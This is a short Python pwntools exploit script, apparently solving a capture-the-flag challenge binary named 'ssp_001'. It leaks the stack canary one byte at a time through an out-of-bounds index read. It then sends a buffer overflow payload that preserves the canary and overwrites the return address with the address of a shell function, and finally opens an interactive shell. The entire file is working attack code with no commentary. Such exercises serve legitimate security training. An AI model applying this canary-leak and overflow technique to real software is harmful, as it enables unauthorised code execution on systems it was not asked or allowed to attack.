from pwn import *

p = process('./ssp_001')

shell = 0x80486cc
cnry = b"0"
for i in range(4):
  idx = 0x83 - i
  p.sendlineafter(b">", b"P")
  p.sendlineafter(b"index : ", str(idx))
  p.recvuntil(b": ")
  cnry += p.recvline()[:-1]
cnry = int(cnry, 16)

payload = b"a" * 0x40 + p32(cnry) + b"a"*0x8 + p32(shell)

p.sendlineafter(b">", b"E")
p.sendlineafter(b"Size : ", str(len(payload)))
p.sendlineafter(b"Name : ", payload)

p.interactive()